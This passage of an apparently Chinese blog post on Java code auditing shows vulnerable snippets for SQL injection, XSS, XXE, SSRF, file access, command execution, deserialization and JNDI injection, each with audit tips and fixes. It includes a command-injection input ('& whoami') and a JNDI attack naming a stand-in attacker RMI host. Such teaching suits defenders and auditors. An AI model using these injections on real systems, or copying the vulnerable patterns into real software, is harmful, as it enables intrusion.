class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Select * from news where title like ‘%$&#123;title&#125;%’</span><br><span class="line">Select * <span class="function">from news where id <span class="title">in</span> <span class="params">($&#123;id&#125;)</span>，</span></span><br><span class="line"><span class="function">Select * from news where title </span>=‘java’ order by $&#123;time&#125; asc</span><br></pre></td></tr></table></figure><h4 id="审计方法"><a href="#审计方法" class="headerlink" title="审计方法"></a>审计方法</h4><p>对于sql注入来讲，只要是与数据库存在交互的地方，应用程序对用户的输入没有进行有效的过滤，都有可能存在SQL注入漏洞。<br>在实际环境中<strong>，中间件漏洞的sql注入漏洞可能更多：</strong></p><ul><li>Mybatis框架中的like、in和order by语句。</li><li>Hibernate框架中的createQuery()函数</li></ul><p>快速定位相关sql语句上下文，查看是否有显式过滤机制。</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ul><li><p>参数化查询，使用java.sql.PreparedStatement来对数据库发起参数化查询。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stmt=conncetion.prepareStatement(sqlString);</span><br><span class="line">stmt.setString(<span class="number">1</span>,userName);</span><br><span class="line">stmt.setString(<span class="number">2</span>,itemName);</span><br><span class="line">rs=stmt.executeQuery();</span><br></pre></td></tr></table></figure></li><li><p>使用预编译能够预防绝大多数SQL注入，<strong>java.sql.PreparedStatement代替java.sql.Statement</strong>,但对于order by后的不能用预编译进行处理，只能手动过滤。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String sqlString = <span class="string">&quot;select * from db_user where username=? and password=?&quot;</span>;</span><br><span class="line">        PreparedStatement stmt = connection.prepareStatement(sqlString);</span><br><span class="line">        stmt.setString(<span class="number">1</span>, username);</span><br><span class="line">        stmt.setString(<span class="number">2</span>, pwd);</span><br><span class="line">        ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure></li><li><p>Mybatis的SQL配置中，采用#变量名称</p><h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><h4 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h4><p>网站与后端交互的输入输出没有做好过滤，导致攻击者可以插入恶意js语句进行攻击。根据后端代码不同 ，大致可以分为反射型、存储型、DOM型<br>举例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/xss&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">xss</span><span class="params">(HttpServletRequest request,HttpServletResponse</span></span></span><br><span class="line"><span class="function"><span class="params">response)</span> <span class="keyword">throws</span> ServletException,IOException</span>&#123;</span><br><span class="line"> String name = request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"> ModelAndView mav = <span class="keyword">new</span> ModelAndView(<span class="string">&quot;mmc&quot;</span>);</span><br><span class="line"> mav.getModel().put(<span class="string">&quot;uname&quot;</span>, name);</span><br><span class="line"> <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里接收了用户输入的参数name，然后又直接输出到了页面，整个过程没有任何过滤，</p><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a><strong>存储型</strong></h4><p>根据已知的用户ID查询该用户的数据并显示在JSP页面上。如果存入的数据存在未经过滤的恶意js代码。就会造成xss攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  ...</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">&quot;select * from users where id =&quot;</span> + id);</span><br><span class="line">    String address = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">        rs.next();</span><br><span class="line">        address = rs.getString(<span class="string">&quot;address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="审计方法-1"><a href="#审计方法-1" class="headerlink" title="审计方法"></a>审计方法</h4><p>全局搜索用户的输入与输出，查找是否存在过滤。</p><h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4></li><li><p>配置全局过滤器web.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;  </span><br><span class="line">        &lt;filter-name&gt;XssSafe&lt;/filter-name&gt;  </span><br><span class="line">        &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">XssFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;  </span></span><br><span class="line"><span class="class">        &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">XssSafe</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;  </span></span><br><span class="line"><span class="class">        &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用commons.lang包，主要提供了字符串查找、替换、分割、去空白、去掉非法字符等等操作。有几个函数可以用来过滤。</p><ul><li>StringEscapeUtils.escapeHtml(string)，使用HTML实体，转义字符串中的字符。</li><li>StringEscapeUtils.escapeJavaScript(string)，使用JavaScript字符串规则转义字符串中的字符。<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><h4 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h4>XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<h4 id="审计方法-2"><a href="#审计方法-2" class="headerlink" title="审计方法"></a>审计方法</h4>XML解析一般在导入配置、数据传输接口等场景会用到，xml解析器是否禁用外部实体。<br>全局搜索如下函数:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathEx</span><br></pre></td></tr></table></figure><h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4></li></ul></li><li><p>使用白名单检验，例如上面的代码增加正则匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!Pattern.matches(<span class="string">&quot;[_a-bA-B0-9]+&quot;</span>, user.getUserId()))</span><br><span class="line"><span class="keyword">if</span> (!Pattern.matches(<span class="string">&quot;[_a-bA-B0-9]+&quot;</span>, user.getDescription()))</span><br></pre></td></tr></table></figure></li><li><p>使用安全的XML库，使用dom4j来构建XML,dom4j会对文本数据域进行xml编码。</p><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><h4 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h4><p>代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。<br>java的SSRF利用方式比较局限:</p></li><li><p>利用file协议任意文件读取。</p></li><li><p>利用http协议端口探测</p><h4 id="支持的一些协议"><a href="#支持的一些协议" class="headerlink" title="支持的一些协议:"></a><em>支持的一些协议:</em></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc</span><br></pre></td></tr></table></figure><p>举例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">         String htmlContent;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">             <span class="comment">//URL对象用openconnection()获得openConnection类对象。</span></span><br><span class="line">             URLConnection urlConnection = u.openConnection();</span><br><span class="line">             HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</span><br><span class="line">             BufferedReader base = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">             <span class="comment">//用inputStream获取字节流然后使用InputStreamReader转化为字符流。</span></span><br><span class="line">             StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">             <span class="keyword">while</span> ((htmlContent = base.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                 html.append(htmlContent);</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure><p>漏洞代码四种情况</p></li><li><p>Request</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute()</span><br></pre></td></tr></table></figure></li><li><p>openStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL u;</span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"><span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();</span><br></pre></td></tr></table></figure></li><li><p>HttpClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;http://127.0.0.1&quot;</span>;</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 该行代码发起网络请求</span></span><br><span class="line">    httpResponse = client.execute(httpGet);</span><br></pre></td></tr></table></figure></li><li><p>URLConnection和HttpURLConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLConnection urlConnection = url.openConnection();</span><br><span class="line">HttpURLConnection urlConnection = url.openConnection();</span><br></pre></td></tr></table></figure><h4 id="审计方法-3"><a href="#审计方法-3" class="headerlink" title="审计方法"></a>审计方法</h4><p>只要是能够对外发起网络请求的地方，就有可能会出现SSRF漏洞。重点查找以下函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br></pre></td></tr></table></figure></li><li><p>new URL()：构造一个url对象</p></li><li><p>openConnection():创建一个实例URLConncetion.</p></li><li><p>getInputStream()：获取URL的字节流</p><h4 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h4></li></ul><ol><li>取URL的Host</li><li>取Host的IP</li><li>判断是否是内网IP，是内网IP直接return，不再往下执行</li><li>请求URL</li><li>如果有跳转，取出跳转URL，执行第1步</li><li>当判断完成最后会去请求URL <h3 id="任意文件操作类漏洞"><a href="#任意文件操作类漏洞" class="headerlink" title="任意文件操作类漏洞"></a>任意文件操作类漏洞</h3><h4 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h4>常见的一些java文件操作类的漏洞:任意文件的读取、下载、删除、修改，这类漏洞的成因基本相同，都是因为程序没有对文件和目录的权限进行严格控制，或者说程序没有验证请求的资源文件是否合法导致的。<br>举例:<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a><strong>任意文件读取</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GET</span></span><br><span class="line"><span class="meta">@Path(&quot;/images/&#123;image&#125;&quot;)</span></span><br><span class="line"><span class="meta">@Produces(&quot;images/*&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">getImage</span><span class="params">(<span class="meta">@javax</span>.ws.rs.PathParam(<span class="string">&quot;image&quot;</span>)</span> String image) </span>&#123;</span><br><span class="line">    File file = <span class="keyword">new</span> File(<span class="string">&quot;resources/images/&quot;</span>, image); <span class="comment">//Weak point</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">        <span class="keyword">return</span> Response.status(Status.NOT_FOUND).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response.ok().entity(<span class="keyword">new</span> FileInputStream(file)).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">getWordList</span><span class="params">(value:String)</span> </span>= Action &#123;</span><br><span class="line">  <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;public/lists/&quot;</span> + value))) &#123;</span><br><span class="line">    NotFound(<span class="string">&quot;File not found&quot;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    val result = Source.fromFile(<span class="string">&quot;public/lists/&quot;</span> + value).getLines().mkString <span class="comment">// Weak point</span></span><br><span class="line">    Ok(result)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a><strong>任意文件写入</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file file = <span class="keyword">new</span> File(getExternalFilesDir(TARGET_TYPE), filename);</span><br><span class="line">fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">fos.write(confidentialData.getBytes());</span><br><span class="line">fos.flush();</span><br></pre></td></tr></table></figure><h4 id="审计方法-4"><a href="#审计方法-4" class="headerlink" title="审计方法"></a>审计方法</h4>全局搜索关键字或者方法</li></ol><ul><li>FileInputStream</li><li>getPath</li><li>getAbsolutePath</li><li>ServletFileUpload</li></ul><p>排查程序的安全策略配置文件，查找permission Java.io.FilePermission，<strong>查看IO方案是否只对程序的绝对路径赋予读写权限。</strong></p><h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><ul><li><p>配置全局安全策略</p></li><li><p>使用File.getCanonicalPath()方法，该方法会对所有别名、快捷方式以及符号链接进行一致 地解析。特殊的文件名，例如“..”会被移除。</p><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><h4 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h4><p>服务端没有针对执行命令的函数进行过滤，导致攻击者可以提交恶意构造语句。java中常见如：Runtime.exec() Process ProcessBuilder.start</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>Java中的命令执行离不开调用反射的机制，在实际的场景往往离不开反序列化的利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String dir = System.getProperty(“dir”);</span><br><span class="line">        Process process = <span class="keyword">null</span>;</span><br><span class="line">        InputStream istream = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="string">&quot;cmd.exe /c dir&quot;</span> + dir);</span><br><span class="line">            <span class="keyword">int</span> result = process.waitFor();</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;process error: &quot;</span> + result);</span><br><span class="line">            &#125;</span><br><span class="line">            istream = (result == <span class="number">0</span>) ? process.getInputStream() : process.getErrorStream();</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> (istream.read(buffer) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print(<span class="keyword">new</span> String(buffer, “gb2312”));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (istream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    istream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (process != <span class="keyword">null</span>) &#123;</span><br><span class="line">                process.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码利用Runtime.exec()方法调用dir命令。<br>攻击者可以利用&amp;符号执行多条命令，例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddir=<span class="string">&quot;..\\ &amp; whoami</span></span><br></pre></td></tr></table></figure><h4 id="审计方法-5"><a href="#审计方法-5" class="headerlink" title="审计方法"></a>审计方法</h4><p>RCE出现的原因和场景很多，以后慢慢学习~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line">服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line">由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、JST+EL等</span><br><span class="line">由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line">由java一些脚本语言引起的 RCE 漏洞，常见的如：Groovy、JavascriptEngine等</span><br><span class="line">由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic等</span><br></pre></td></tr></table></figure><p>审计的时候可以重点寻找：</p></li><li><p>Runtime.exec()</p></li><li><p>Process</p></li><li><p>ProcessBuilder.start()</p><h4 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h4></li><li><p>正则表达式匹配用户输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!Pattern.matches(<span class="string">&quot;[0-9A-Za-z@.]+&quot;</span>, dir)) &#123;</span><br></pre></td></tr></table></figure><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><h4 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h4><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h4 id="审计方法-6"><a href="#审计方法-6" class="headerlink" title="审计方法"></a>审计方法</h4><p>反序列化操作常常出现在<strong>导入模版文件、网络通信、数据传输、日志格式化存储或者数据库存储</strong>等业务功能处,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控。</p></li><li><p>ObjectInputStream.readObject</p></li><li><p>ObjectInputStream.readUnshared</p></li><li><p>XMLDecoder.readObject</p></li><li><p>XStream.fromXML</p></li><li><p>第三方jar包:ObjectMapper.readValue,jackson中的JSON.parseObject,fastjson中的api</p><h4 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h4></li><li><p>升级服务端所依赖的可能被利用的jar包，包括JDK。</p></li><li><p>在执行反序列前对InputStream对象进行检查过滤</p><h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><h4 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h4></li></ul><p> <strong>中间件</strong>是提供系统软件和应用软件之间连接的软件，它将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。<br>java常见的中间件:<br><img src="/images/image-4-5559060.png" alt="image-4"></p><h4 id="审计方法-7"><a href="#审计方法-7" class="headerlink" title="审计方法"></a>审计方法</h4><p>直接打开pom.xml文件查看其使用的中间件及其版本，然后到漏洞库里找漏洞即可。<br><img src="/images/QQ%E6%88%AA%E5%9B%BE20210127114728-5558892.png" alt="QQ截图20210127114728"></p><h4 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h4><p>及时更新项目使用的java中间件的版本。</p><h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3><h4 id="成因-8"><a href="#成因-8" class="headerlink" title="成因"></a>成因</h4><p>常见的业务逻辑漏洞主要是越权，分为平行越权和垂直越权。在javaweb的各个功能点中都可能存在越权漏洞。<br>主要原因还是因为程序没有对当前用户的权限进行严格控制，或者是后台没有判断当前用户id。</p><h4 id="审计方法-8"><a href="#审计方法-8" class="headerlink" title="审计方法"></a>审计方法</h4><p>在每个request.getParameter(“userid”);之后查看是否有检验当前用户与要进行增删改查的用户。</p><h4 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h4><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><h4 id="ldap注入"><a href="#ldap注入" class="headerlink" title="ldap注入"></a>ldap注入</h4><p>就像sql，所有进入到ldap查询的语句都必须要保证安全。不幸的是，ldap没有像sql那样的预编译接口。所以，现在的主要防御方式是，在参数进入ladp查询之前对其进行严格的检验。</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NamingEnumeration&lt;SearchResult&gt; answers &#x3D; context.search(&quot;dc&#x3D;People,dc&#x3D;example,dc&#x3D;com&quot;,</span><br><span class="line">        &quot;(uid&#x3D;&quot; + username + &quot;)&quot;, ctrls);</span><br></pre></td></tr></table></figure><h4 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h4><p>Java Naming and Directory Interface，Java命名和目录接口，通过调用JNDI的API应用程序可以定位资源和其他程序对象，现在JNDI能访问的服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA。</p><p>JNDI注入的关键是在用户进行远程方法调用时返回的stub是一个reference类型的对象，且用户本地CLASSPATH不存在该类字节码，导致用户需要加载reference类的字节码，直接返回恶意类字节码命令执行</p><p>JNDI中有绑定和查找的方法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- bind：将第一个参数绑定到第二个参数的对象上面</span><br><span class="line">- lookup：通过提供的名称查找对象</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</span><br><span class="line">攻击者控制URI参数为恶意的RMI服务地址，如：rmi:&#x2F;&#x2F;hacker_rmi_server&#x2F;&#x2F;name；</span><br><span class="line">攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</span><br><span class="line">目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</span><br><span class="line">攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</span><br></pre></td></tr></table></figure><h4 id="rmi反序列化"><a href="#rmi反序列化" class="headerlink" title="rmi反序列化"></a>rmi反序列化</h4><p><a href="http://wjlshare.com/archives/1522">http://wjlshare.com/archives/1522</a></p><h4 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h4><p>Spring使用动态值构建。应该严格检验源数据，以避免未过滤的数据进入到危险函数中。</p><p>关键sink函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SpelExpressionParser</span><br><span class="line">getValue</span><br></pre></td></tr></table></figure><p>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix&#x3D;&quot;spring&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;tags&quot; %&gt;</span><br><span class="line">&lt;spring:eval expression&#x3D;&quot;$&#123;param.lang&#125;&quot; var&#x3D;&quot;lang&quot; &#x2F;&gt;</span><br><span class="line">&lt;%@ taglib prefix&#x3D;&quot;spring&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;tags&quot; %&gt;</span><br><span class="line">&lt;spring:eval 